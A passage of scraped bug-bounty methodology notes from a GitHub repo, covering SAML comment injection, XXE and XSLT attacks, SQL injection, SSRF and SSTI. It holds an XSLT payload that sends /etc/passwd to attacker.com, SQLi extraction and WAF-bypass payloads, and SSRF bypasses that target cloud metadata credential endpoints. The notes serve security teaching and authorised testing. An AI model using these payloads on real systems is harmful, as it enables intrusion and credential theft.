\"admin<!--comment-->@email.com\" while registering\n3. SP think it as admin@email.com \n4. Done, you are admin now ;)\n\n# SAML: Comment Injection II\n1. Find Registeration page for SP\n2. Register as any user like \"admin<!--comment-->@gmail.com\" ==> Invalid signature\n3. Try different \"admin@gmail.com<!--comment-->.test\" ==> valid signature\n4. SP think it as admin@email.com \n5. Done, you are admin now ;)\n```\n\n6. **XXE  in SAML:**\n\n```python\n**NOTE:** You can try all XXE attack techniques here its not limited to this only.\n\n# SIMPLE XXE ATTACK:\n1. Intercept the SAML Response in SAML Raider\n2. Add XXE payload in the beginning like below:\n\t\t<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\t\t <!DOCTYPE foo [  \n\t   <!ELEMENT foo ANY >\n\t   <!ENTITY    file SYSTEM \"file:///etc/passwd\">\n\t   <!ENTITY dtd SYSTEM \"http://www.attacker.com/text.dtd\" >]>\n3. Send the Request and check the response.\n4. Done, escalate further!.\n```\n\n7. **XSLT in SAML:**\n\n```python\n**NOTE:**\n- The attack doesn’t require a valid signature to succeed.\n- The XSLT transformation occurs before the digital signature is processed for verification.\n\n# Steps to Perform:\n1**. Intercept the SAML Response in SAML Raider.\n2. Add XSLT payload in side transforms assertion like below.\n\t\t<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n\t  ...\n\t    <ds:Transforms>\n\t      <ds:Transform>\n\t        <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n\t          <xsl:template match=\"doc\">\n\t            <xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/>\n\t            <xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/>\n\t            <xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/>\n\t            <xsl:variable name=\"exploitUrl\" select=\"concat($attackerUrl,$escaped)\"/>\n\t            <xsl:value-of select=\"unparsed-text($exploitUrl)\"/>\n\t          </xsl:template>\n\t        </xsl:stylesheet>\n\t      </ds:Transform>\n\t    </ds:Transforms>\n\t  ...\n\t\t</ds:Signature>\n3. Forward the request and check response.\n4. Done Escalate Further.!! \n```\n\n# Tools:\n\n[SAML Encoder - Online SAML Request-Response Encode Tool - Base64 - Deflate](https://www.samltool.com/encode.php)\n\n[https://github.com/CompassSecurity/SAMLRaider](https://github.com/CompassSecurity/SAMLRaider)\n\n[GitHub - fadyosman/SAMLExtractor: A tool that can take a URL or list of URL and prints back SAML consume URL.](https://github.com/fadyosman/SAMLExtractor)\n\n# Labs:\n\n[GitHub - yogisec/VulnerableSAMLApp: Vulnerable SAML infrastructure training applicaiton](https://github.com/yogisec/VulnerableSAMLApp)\n\n# Reference:\n\n[How to Hunt Bugs in SAML; a Methodology - Part I -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)\n\n[How to Hunt Bugs in SAML; a Methodology - Part II -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\n\n[How to Hunt Bugs in SAML; a Methodology - Part III -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)\n\n[https://sso-attacks.org/Main_Page](https://sso-attacks.org/Main_Page)\n\n[https://research.aurainfosec.io/bypassing-saml20-SSO/](https://research.aurainfosec.io/bypassing-saml20-SSO/)\n\n[SAML From A Hackers Perspective - Part 1 Intro](https://www.youtube.com/watch?v=KEwki41ZWmg&list=PLCwnLq3tOElrEU-KoOdeiixiNCWkeQ99F&index=1)\n\n[Verification of SAML Tokens - Traps and Pitfalls](https://web-in-security.blogspot.com/2014/10/verification-of-saml-tokens-traps-and.html)\n\n## Mind-Maps:\n\n- [Mind Map by Harsh Bothra Checklist for SAML.pdf](https://drive.google.com/file/d/1iLgbd9IbcYgu4n1yJAVUyYbWnzYXmbyp/view?usp=drivesdk)\n\n![https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png](https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png)\n\n# Tips:\n\n```python\nGoogle Dork to Find SAML logins:\ninurl:\"/saml2?SAMLRequest=\"\ninurl:\"/simplesaml/module.php/core/loginuserpass.php?AuthState=\"\ninurl:\"simplesaml/saml2/idp\"\n\nBurp search [SAMLResponse]\n 1.PHNhbWx -> b64decode -> '<saml'\n 2.PD94bWw -> b64decode -> '<?xml'\n```\n\n### Author:\n- [Kathan Patel](https://twitter.com/KathanP19)\n", "timestamp": "2025-10-21T22:02:17.471720"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "SQLi/SQL_Injection.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/SQLi/SQL_Injection.md", "content": "# SQL Injection\nHere are some quick methods to detect the SQL Injection vulnerability, though the methods are not limited. There are various tricks and tools.\n\n# Methods To Find Sqli\n\n## 1. Using Burpsuite :\n```\n  1. Capture the request using burpsuite.\n  2. Send the request to burp scanner.\n  3. Proceed with active scan.\n  4. Once the scan is finished, look for SQL vulnerability that has been detected.\n  5. Manually try SQL injection payloads.\n  6. Use SQLMAP to speed up the process.\n```\n## 2. Using waybackurls and other bunch of tools :\n```\n  1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)\n  2. cat domains | httpx | tee -a alive\n  3. cat alive | waybackurls | tee -a urls\n  4. gf sqli urls >> sqli\n  5. sqlmap -m sqli --dbs --batch\n  6. use tamper scripts\n```\n* More Details in this source thread [https://twitter.com/El3ctr0Byt3s/status/1302706241240731649](https://twitter.com/El3ctr0Byt3s/status/1302706241240731649)\n\n## 3. Using heuristic scan to get hidden parameters :\n```\n  1. Use subdomain enumeration tools on the domain.\n  2. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains.\n  3. You can use the same method described above in 2nd point.\n  4. Use Arjun to scan for the hidden params in the urls. \n  5. Use --urls flag to include all urls.\n  6. Check the params as https://domain.com?<hiddenparam>=<value>\n  7. Send request to file and process it through sqlmap.\n```\n## 4. Error generation with untrusted input or special characters :\n```\n  1. Submit single quote character ' & look for errors.\n  2. Submit SQL specific query.\n  3. Submit Boolean conditions such as or 1=1 and or 1=0, and looking application's response.\n  4. Submit certain payloads that results in time delay.\n```\n# Post-Methods\n## 1. Finding total number of columns with order by or group by or having :\n```\n  Submit a series of ORDER BY clause such as \n\t  \n    ' ORDER BY 1 --\n\t  ' ORDER BY 2 --\n    ' ORDER BY 3 --\n    \n    and incrementing specified column index until an error occurs.\n```\n## 2. Finding vulnerable columns with union operator :\n```\n  Submit a series of UNION SELECT payloads.\n  \n\t  ' UNION SELECT NULL --\n    ' UNION SELECT NULL, NULL --\n    ' UNION SELECT NULL, NULL, NULL --\n    \n  (Using NULL maximizes the probability that the payload will succeed. NULL can be converted to every commonly used data type.)\n```\n* To go for the methods in more detail, go through portswigger site.\n  \n  https://portswigger.net/web-security/sql-injection/union-attacks\n\n## 3. Extracting basic information like database(), version(), user(), UUID() with concat() or group_concat()\n\n### 1. Database version\n```\n    Oracle \t\t\t  SELECT banner FROM v$version\n\t\t       \t\t  SELECT version FROM v$instance\n    \n    Microsoft \t\t\t  SELECT @@version\n    \n    PostgreSQL \t\t\t  SELECT version()\n    \n    MySQL \t\t\t  SELECT @@version\n```\n### 2. Database contents\n```\n    Oracle        SELECT * FROM all_tables\n\t          SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'\n    \n    Microsoft \t  SELECT * FROM information_schema.tables\n                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\n    \n    PostgreSQL \t  SELECT * FROM information_schema.tables\n                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\n\n    MySQL         SELECT * FROM information_schema.tables\n                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\n```\n### 3. Shows version, user and database name\n```\n   ' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())\n```\n### 4. Using group_concat() function, used to concat all the rows of the returned results.\n```  \n   ' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()–\n```\n## 4. Accessing system files with load_file(). and advance exploitation afterwards :\n```\n   ' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')\n```\n## 5. Bypassing WAF :\n\n### 1. Using Null byte before SQL query.\n```\n    %00' UNION SELECT password FROM Users WHERE username-'xyz'--\n```\n### 2. Using SQL inline comment sequence.\n```\n    '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'-- \n```\n### 3. URL encoding\n```      \n      for example :\n    / URL encoded to %2f\n    * URL encoded to %2a\n\n    Can also use double encoding, if single encoding doesn't works. Use hex encoding if the rest doesn't work.\n```\n### 4. Changing Cases (uppercase/lowercase)\n* For more step wise detailed methods, go through the link below.\n\n  https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF\n### 5. Use SQLMAP tamper scripts. It helps bypass WAF/IDS/IPS.\n* 1. Use Atlas. It helps suggesting tamper scripts for SQLMAP.\n     \n     https://github.com/m4ll0k/Atlas\n* 2. JHaddix post on SQLMAP tamper scripts.\n     \n     https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423\n        \n## 6. Time Delays :\n```\n      Oracle \t      dbms_pipe.receive_message(('a'),10)\n      \n      Microsoft \t  WAITFOR DELAY '0:0:10'\n      \n      PostgreSQL \t  SELECT pg_sleep(10)\n      \n      MySQL \t      SELECT sleep(10) \n```      \n## 7. Conditional Delays :\n```\n      Oracle \t      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual\n      \n      Microsoft \t  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'\n      \n      PostgreSQL \t  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END\n      \n      MySQL \t      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') \n```      \n# Resources and tools that will help gain an upper hand on finding bugs :\n* Portswigger SQL Injection cheat sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet\n* HTTPX - https://github.com/encode/httpx\n* GF patterns - https://github.com/1ndianl33t/Gf-Patterns\n* GF (Tomnomnom)- https://github.com/tomnomnom/gf\n* We can also use gau with waybackurls to fetch all urls.\n* Waybackurls - https://github.com/tomnomnom/waybackurls\n* Gau - https://github.com/lc/gau\n* Arjun - https://github.com/s0md3v/Arjun\n* Hakcrawler - https://github.com/hakluke/hakrawler\n\n\n### Author :\n\n* [@xhan1x](https://twitter.com/xhan1x)\n", "timestamp": "2025-10-21T22:02:18.038770"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "SSRF/Blind_SSRF.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/SSRF/Blind_SSRF.md", "content": "# Blind SSRF\nBlind SSRF's are those that don't show enumerated data directly to the user and hence are known as blind SSRF.\n\n## Different Methods:\n\n### Methodology #1:\n**Header** **Injection**:\n\nOne way of finding them is by inserting your burp collaborator domain into the referrer header also known as host header injection.\n\nSnippet:\n```\n    GET /HTTP 1.1\n    Host: site.tld\n    User Agent: Firefox\n    Referrer: https://your_collaborator_instance.com\n\n```\n\n\n Many organizations use services that analyse which url or service is referring the visitor to their site. Execution of this type of attack depends upon the underlying service in my case the server was running on an aws ec2 instance but i was unable to get to it's admin panel namely (192.168.192.168) as it was only performing a lookup on me but not allowing anythng beyond that. Try it on different sites and services that you come across you just might get lucky.\n\nI will list more as i find if you have found any please kindly list them here so that other's beneift from it.\n\n### Contributor:\n * [@cowlingbanana](https://github.com/cowlingbanana)\n\n", "timestamp": "2025-10-21T22:02:18.610835"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "SSRF/SSRF-old.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/SSRF/SSRF-old.md", "content": "# SSRF ( Server-Side-Request-Forgery)\n* What's SSRF ??\n   * SSRF is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker.\n\n## Where to look for ??\n\n1. If you got Open Redirect try escalating it to SSRF.\n\n2. gf SSRF to grep parameters may vulnerable to SSRF.\n\n3. SSRF's are more in API's so crawl the whole web app with burp proxy turned on and search for keywords like., eg :\n```\n?url=\n?uri=\n?req= \netc.....\n```\n4. Sign up with an Email like blabla.collaborator.net. If u receive HTTP req. in collaborator then its SSRF. But if there's no impact Don't Report it :) DNS and SMTP req. Doesn't matters.\n\n## AWS Metadata\nMost of the sites use AWS nowadays...\n\n* AWS localhost is 169.254.169.254 so don't use 127.0.0.1 there!\n\n* If you found an SSRF vulnerability that runs on EC2, try requesting :\n```\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/user-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/\n```\n* Source: https://twitter.com/ADITYASHENDE17/status/1305051512335298562\n\n## Escalation\n\n* SSRF can be Escalated to RCE :) [Impact High] \n* `<os cmd>`.collaborator.net (thehackerish has a good video in it :)\n* If there's no impact! on your SSRF rather than a redirect try to escalate it to XSS.\n\n## Resources 💯\n### Youtube\n* https://www.youtube.com/watch?v=U0bPPw6uPgY&t=1s\n* https://www.youtube.com/watch?v=324cZic6asE\n* https://www.youtube.com/watch?v=o-tL9ULF0KI\n* https://www.youtube.com/watch?v=324cZic6asE&t=751s\n* https://youtu.be/m4BxIf9PUx0\n* https://youtu.be/apzJiaQ6a3k\n* [A New Era of SSRF](https://www.youtube.com/watch?v=R9pJ2YCXoJQ) by [Orange Tsai](https://blog.orange.tw/)\n\n### Hackerone Reports\n* https://hackerone.com/hacktivity?order_field=popular&filter=type%3Apublic&querystring=SSRF\n* https://hackerone.com/reports/737161\n* https://hackerone.com/reports/816848\n* https://hackerone.com/reports/398799\n* https://hackerone.com/reports/382048\n* https://hackerone.com/reports/406387\n* https://hackerone.com/reports/736867\n* https://hackerone.com/reports/517461\n* https://hackerone.com/reports/508459\n* https://hackerone.com/reports/738553\n* https://hackerone.com/reports/514224\n* https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF\n* https://hackerone.com/reports/341876\n* https://hackerone.com/reports/793704\n* https://hackerone.com/reports/386292\n* https://hackerone.com/reports/326040\n* https://hackerone.com/reports/310036\n* https://hackerone.com/reports/643622\n* https://hackerone.com/reports/885975\n* https://hackerone.com/reports/207477\n* https://hackerone.com/reports/514224\n\n### Blogs\n* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978\n* https://medium.com/@kapilvermarbl/ssrf-server-side-request-forgery-5131ffd61c3c\n* https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326\n* https://medium.com/@chawdamrunal/what-is-server-side-request-forgery-ssrf-7cd0ead0d95f\n* https://medium.com/swlh/ssrf-in-the-wild-e2c598900434\n* https://medium.com/@briskinfosec/ssrf-server-side-request-forgery-ae44ec737cb8\n* https://medium.com/@GAYA3_R/vulnerability-server-side-request-forgery-ssrf-9fe5428184c1\n* https://medium.com/@gupta.bless/exploiting-ssrf-for-admin-access-31c30457cc44\n* https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-f62235a2c151\n* https://medium.com/@dlpadmavathi.us/ssrf-attack-real-example-a7279256abee\n* https://blog.securityinnovation.com/the-many-faces-of-ssrf\n* https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/\n* http://www.techpna.com/uptzh/blind-ssrf-medium.html\n* https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90\n* http://institutopaideia.com.br/journal/blind-ssrf-medium-cfa769\n* https://www.reddit.com/r/bugbounty/comments/cux2zs/ssrf_in_the_wild_the_startup_medium/\n* https://www.sonrn.com.br/blog/5a44cc-blind-ssrf-medium\n* https://ssrf-bypass-medium.thickkare.pw/\n* https://hackerone.com/reports/326040\n* https://www.zerocopter.com/vulnerabilities-price-list-printable\n* https://medium.com/swlh/intro-to-ssrf-beb35857771f\n* https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a\n* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739\n* https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-testing-b9dfe57cca35\n* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0\n* https://medium.com/bugbountywriteup/tagged/ssrf\n* https://medium.com/seconset/all-about-ssrf-524f41ab96df\n* https://blog.cobalt.io/from-ssrf-to-port-scanner-3e8ef5921fbf\n* https://portswigger.net/web-security/ssrf\n* https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery\n\n### Github Repos\n* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery\n* https://github.com/jdonsec/AllThingsSSRF\n\n### Author:\n* [@0xCyberPirate](https://twitter.com/0xCyberPirate)\n* [0xrtt](https://twitter.com/0xrtt)\n", "timestamp": "2025-10-21T22:02:18.735492"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "SSRF/SSRF.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/SSRF/SSRF.md", "content": "## What is SSRF?\n\nIn a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL, which the code running on the server will read or submit data. By carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP-enabled databases or perform POST requests towards internal services that are not intended to be exposed.\n\nThe target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (like path traversal, etc.).\n\nWhen the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs, the attacker may be able to read data from services that are not directly exposed on the internet:\n\n- **Cloud server meta-data** — Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted\n- **Database HTTP interfaces** — NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data internal REST interfaces\n- **Files** — The attacker may be able to read files using file:// URIs. The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.\n\n## What is its impact?\n\nA malicious actor can retrieve the content of arbitrary files on the system, which leads to sensitive information exposure(passwords, source code, confidential data, etc.).\n\n1. Sensitive Data Exposure\n2. Unauthenticated Requests\n3. Port Scans or Cross Site Port Attack (XSPA)\n4. Protocol Smuggling\n\n## **Key Points To Test SSRF Vulnerability :**\n\n1. Always make sure that you are making request to back end server on the behalf of public server not from the browser.\n2. To fetch the data from server also try http://localhost/xyz/ with the http://127.0.0.1/xyz.\n3. Server may have the firewall protection always try to bypass the firewall if possible.\n4. Make sure that request is coming from server not from your local host.\n\n## Where to look for :\n\n```jsx\nuri=\nlogout_redirect_uri=\nurl=\npage=\nproxy=\nfwd=\nforward=\nu=\ndata=\npage=\nurl=\t\nret=\t\nr2=\t\nimg=\t\nu\t\nreturn\t\nr\t\nURL\t\nnext\t\nredirect\t\nredirectBack\t\nAuthState\t\nreferer\t\nredir\t\nl\t\naspxerrorpath\t\nimage_path\t\nActionCodeURL\t\nreturn_url\t0\nlink\t\nq\t\nlocation\t\nReturnUrl\t\nuri\t\nreferrer\t\nreturnUrl\nforward\t\nfile\nrb\t\nend_display\t\nurlact\t\nfrom\t\ngoto\t\npath\t\nredirect_url\t\nold\t\npathlocation\t\nsuccessTarget\t\nreturnURL\t\nurlsito\t\nnewurl\t\nUrl\t\nback\t\nretour\t\nodkazujuca\nr_link\t\ncur_url\t\nH_name\t\nref\t\ntopic\t\nresource\t\nreturnTo\t\nhome\t0.2%\nnode\t0.2%\nsUrl\t0.2%\nhref\t0.2%\nlinkurl\t0.2%\nreturnto\t0.2%\nredirecturl\t0.2%\nSL\t0.2%\nst\t0.2%\nerrorUrl\t0.2%\nmedia\t0.2%\ndestination\t0.2%\ntargeturl\t0.2%\nreturn_to\t0.2%\ncancel_url\t0.2%\ndoc\t0.2%\nGO\t0.2%\nReturnTo\t0.2%\nanything\t0.2%\nFileName\t0.2%\nlogoutRedirectURL\t0.2%\nlist\t0.2%\nstartUrl\t0.2%\nservice\t0.2%\nredirect_to\t0.2%\nend_url\t0.2%\n_next\t0.2%\nnoSuchEntryRedirect\t0.2%\ncontext\t0.2%\nreturnurl\t0.2%\nref_url\t0.2%\n```\n\n## 1-SSRF attacks against the server itself\n\nIn an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This will typically involve supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost.\n\nBasic Localhost Payloads:\n\n```\nhttp://127.0.0.1:port\nhttp://localhost:port\nhttps://127.0.0.1:port\nhttps://localhost:port\nhttp://[::]:port\nhttp://0000::1:port\nhttp://[0:0:0:0:0:ffff:127.0.0.1]\nhttp://0/\nhttp://127.1\nhttp://127.0.1\n```\n\n**Steps to reproduce:**\n\n1-Try to use burpcollab to check if the server fetches data from an internal system(interacting with backend)\n\n2-Send request to localhost\n\n3-Try to perform sensitive actions as an unauthenicated users\n\n```jsx\n**Bypasses for Localhost\n\n1-**Bypass using HTTPS\nhttps://127.0.0.1/\nhttps://localhost/\n\n2-Bypass localhost with [::]\nhttp://[::]:80/\nhttp://[::]:25/ SMTP\nhttp://[::]:22/ SSH\nhttp://[::]:3128/ Squid\nhttp://0000::1:80/\nhttp://0000::1:25/ SMTP\nhttp://0000::1:22/ SSH\nhttp://0000::1:3128/ Squid\n\n3-Bypass localhost with a domain redirection\nhttp://spoofed.burpcollaborator.net\nhttp://localtest.me\nhttp://customer1.app.localhost.my.company.127.0.0.1.nip.io\nhttp://mail.ebc.apple.com redirect to 127.0.0.6 == localhost\nhttp://bugbounty.dod.network redirect to 127.0.0.2 == localhost\n\n4-Bypass localhost with CIDR\nhttp://127.127.127.127\nhttp://127.0.1.3\nhttp://127.0.0.0\n\n5-Bypass using a decimal IP location\nhttp://0177.0.0.1/\nhttp://2130706433/ = http://127.0.0.1\nhttp://3232235521/ = http://192.168.0.1\nhttp://3232235777/ = http://192.168.1.1\nhttp://2852039166/  = http://169.254.169.254\n\n6-Bypass using IPv6/IPv4 Address Embedding\nhttp://[0:0:0:0:0:ffff:127.0.0.1]\n\n7-Bypass using malformed urls\nlocalhost:+11211aaa\nlocalhost:00011211aaaa\n\n8-Bypass using rare address\nhttp://0/\nhttp://127.1\nhttp://127.0.1\n\n9-Bypass using URL encoding\nhttp://127.0.0.1/%61dmin\nhttp://127.0.0.1/%2561dmin\n\n10-Bypass using tricks combination\nhttp://1.1.1.1 &@2.2.2.2# @3.3.3.3/\nurllib2 : 1.1.1.1\nrequests + browsers : 2.2.2.2\nurllib : 3.3.3.3\n\n11-Bypass using enclosed alphanumerics\nhttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com\n\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n\n12-Bypass filter_var() php function\n0://evil.com:80;http://google.com:80/\n\n13-Bypass against a weak parser\nhttp://127.1.1.1:80\\@127.2.2.2:80/\nhttp://127.1.1.1:80\\@@127.2.2.2:80/\nhttp://127.1.1.1:80:\\@@127.2.2.2:80/\nhttp://127.1.1.1:80#\\@127.2.2.2:80/\n```\n\n## 2-SSRF URL for Cloud Instances\n\n```jsx\nAWS\nhttp://instance-data\nhttp://169.254.169.254\nhttp://169.254.169.254/latest/user-data\nhttp://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance\nhttp://169.254.169.254/latest/meta-data/ami-id\nhttp://169.254.169.254/latest/meta-data/reservation-id\nhttp://169.254.169.254/latest/meta-data/hostname\nhttp://169.254.169.254/latest/meta-data/public-keys/\nhttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\nhttp://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/dummy\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/s3access\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role\n```\n\n```jsx\nGoogle Cloud\nhttp://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\n```\n\n```jsx\nAzure:\nhttp://169.254.169.254/metadata/v1/maintenance\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02\nhttp://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text\n```\n\n```jsx\nIPv6 Tests:\nhttp://[::ffff:169.254.169.254]\nhttp://[0:0:0:0:0:ffff:169.254.169.254]\n```\n\n```jsx\nECS Task: \nhttp://169.254.170.2/v2/credentials/\n```\n\n```jsx\nDigital Ocean:\nhttp://169.254.169.254/metadata/v1.json\nhttp://169.254.169.254/metadata/v1/ \nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data\nhttp://169.254.169.254/metadata/v1/hostname\nhttp://169.254.169.254/metadata/v1/region\nhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address\n```\n\n```jsx\nPacketcloud:\nhttps://metadata.packet.net/userdata\n```\n\n```jsx\nOracle Cloud:\nhttp://169.254.169.254/opc/v1/instance/\n```\n\n```jsx\nAlibaba Cloud:\nhttp://100.100.100.200/latest/meta-data/\nhttp://100.100.100.200/latest/meta-data/instance-id\nhttp://100.100.100.200/latest/meta-data/image-id\nhttp://100.100.100.200/latest/user-data\n```\n\n## **Impact:**\n\nAn attacker can tunnel into internal networks and access sensitive internal data such as AWS metadata information.\n\n\n## Author:\n[Tushar Verma](https://twitter.com/e11i0t_4lders0n)\n", "timestamp": "2025-10-21T22:02:18.840675"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "SSTI/SSTI.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/SSTI/SSTI.md", "content": "# Some MindMaps\n---\n### SSTI Finding Attack Vector by @what_web\n![https://pbs.twimg.com/media/EnwZh7qXcAEB3wu?format=jpg&name=large](https://pbs.twimg.com/media/EnwZh7qXcAEB3wu?format=jpg&name=large)\n\n### Source\n* [https://twitter.com/jae_hak99/status/1331967876417327104?s=20](https://twitter.com/jae_hak99/status/1331967876417327104?s=20)\n\n### Tools\n+ [tplmap](https://github.com/epinna/tplmap)\n### Author\n* [0xsunil](https://twitter.com/0xsunil)\n", "timestamp": "2025-10-21T22:02:19.397712"}
